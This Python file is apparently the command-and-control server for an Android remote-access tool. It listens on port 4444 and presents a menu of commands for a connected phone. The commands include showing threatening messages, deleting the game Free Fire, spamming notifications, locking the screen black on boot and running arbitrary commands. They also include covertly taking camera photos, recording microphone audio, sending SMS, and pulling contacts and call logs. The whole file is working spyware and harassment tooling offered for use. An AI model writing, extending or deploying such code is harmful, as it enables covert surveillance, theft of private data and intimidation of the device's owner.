import socket
import struct
import sys
import time

HOST = '0.0.0.0'
PORT = 4444
MAX_MESSAGE_SIZE = 8 * 1024 * 1024  # 8 MB maximum size for any message


def _configure_console():
    """Configure console encoding for correct Unicode output on Windows."""
    for stream in (sys.stdin, sys.stdout, sys.stderr):
        reconfigure = getattr(stream, 'reconfigure', None)
        if reconfigure is not None:
            try:
                reconfigure(encoding='utf-8')
            except Exception:
                pass


def _recv_exact(sock, size):
    """Read an exact number of bytes (handles TCP segmenting)."""
    data = b''
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("connection closed by the remote end")
        data += chunk
    return data


def send_message(sock, message):
    """Send a message: 4-byte length (big-endian) + UTF-8 payload."""
    payload = message.encode('utf-8')
    sock.sendall(struct.pack('>I', len(payload)) + payload)


def receive_message(sock):
    """Receive a message with the same framing."""
    header = _recv_exact(sock, 4)
    length = struct.unpack('>I', header)[0]
    if length > MAX_MESSAGE_SIZE:
        raise ConnectionError(f"message too large: {length}")
    payload = _recv_exact(sock, length)
    return payload.decode('utf-8')


class PhoneController:
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        self.server.settimeout(None)
        self.client_socket = None
        self.client_address = None
        self.connected = False

    def start(self):
        print(f"Waiting for connection on {self.host}:{self.port}...")
        while True:
            try:
                self.client_socket, self.client_address = self.server.accept()
                print(f"Connected from {self.client_address}")
                self.connected = True
                self.show_menu()
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f"Connection lost: {e}")
            finally:
                self._disconnect()

    def _disconnect(self):
        self.connected = False
        if self.client_socket is not None:
            try:
                self.client_socket.close()
            except OSError:
                pass
            self.client_socket = None
        self.client_address = None

    def show_menu(self):
        while self.connected:
            print("\n--- Control Panel ---")
            print("1. Show threatening message")
            print("2. Remove Free Fire")
            print("3. Disable Free Fire")
            print("4. Send repeated notifications")
            print("5. Play annoying sound")
            print("6. Change wallpaper")
            print("7. Show black screen on boot")
            print("8. Toggle Wi-Fi")
            print("9. Toggle mobile data")
            print("10. Block other apps")
            print("11. Run custom command")
            print("12. Show device info")
            print("13. Capture camera photo")
            print("14. Record microphone audio")
            print("15. Reboot device")
            print("16. Shut down device")
            print("17. Toggle airplane mode")
            print("18. Send SMS message")
            print("19. Show call log")
            print("20. Show contacts")
            print("0. Exit")

            try:
                choice = input("Choose an operation: ")
            except (EOFError, KeyboardInterrupt):
                print("\nSession ended")
                break

            try:
                if choice == "0":
                    send_message(self.client_socket, "exit")
                    print("Exit command sent")
                    break
                elif choice == "1":
                    self.send_command("show_message")
                elif choice == "2":
                    self.send_command("remove_freefire")
                elif choice == "3":
                    self.send_command("disable_freefire")
                elif choice == "4":
                    count = input("Number of notifications: ")
                    message = input("Message text: ")
                    self.send_command(f"spam_notifications:{count}:{message}")
                elif choice == "5":
                    duration = input("Duration in seconds: ")
                    self.send_command(f"play_annoying_sound:{duration}")
                elif choice == "6":
                    image_path = input("Image path: ")
                    self.send_command(f"change_wallpaper:{image_path}")
                elif choice == "7":
                    self.send_command("black_screen_on_boot")
                elif choice == "8":
                    self.send_command("toggle_wifi")
                elif choice == "9":
                    self.send_command("toggle_mobile_data")
                elif choice == "10":
                    package = input("App package name: ")
                    self.send_command(f"block_app:{package}")
                elif choice == "11":
                    command = input("Custom command: ")
                    self.send_command(f"custom:{command}")
                elif choice == "12":
                    self.send_command("device_info")
                elif choice == "13":
                    self.send_command("capture_camera")
                elif choice == "14":
                    duration = input("Duration in seconds: ")
                    self.send_command(f"record_audio:{duration}")
                elif choice == "15":
                    self.send_command("reboot_device")
                elif choice == "16":
                    self.send_command("shutdown_device")
                elif choice == "17":
                    self.send_command("toggle_airplane_mode")
                elif choice == "18":
                    number = input("Phone number: ")
                    message = input("Message text: ")
                    self.send_command(f"send_sms:{number}:{message}")
                elif choice == "19":
                    self.send_command("call_log")
                elif choice == "20":
                    self.send_command("contacts")
                else:
                    print("Invalid choice")
                    continue

                # Receive the result (each command is followed by a single reply in the protocol)
                result = receive_message(self.client_socket)
                print(f"Result: {result}")
            except (ConnectionError, OSError, EOFError) as e:
                print(f"Lost connection to device: {e}")
                break
            except Exception as e:
                print(f"Unexpected error: {e}")
                break

    def send_command(self, command):
        send_message(self.client_socket, command)

    def close(self):
        self._disconnect()
        if self.server is not None:
            try:
                self.server.close()
            except OSError:
                pass
            self.server = None


if __name__ == "__main__":
    _configure_console()
    while True:
        controller = PhoneController()
        try:
            controller.start()
        except KeyboardInterrupt:
            print("\nProgram closed")
            controller.close()
            break
        except Exception as e:
            print(f"General error: {e}")
            controller.close()
            time.sleep(2)
            print("Restarting the server...")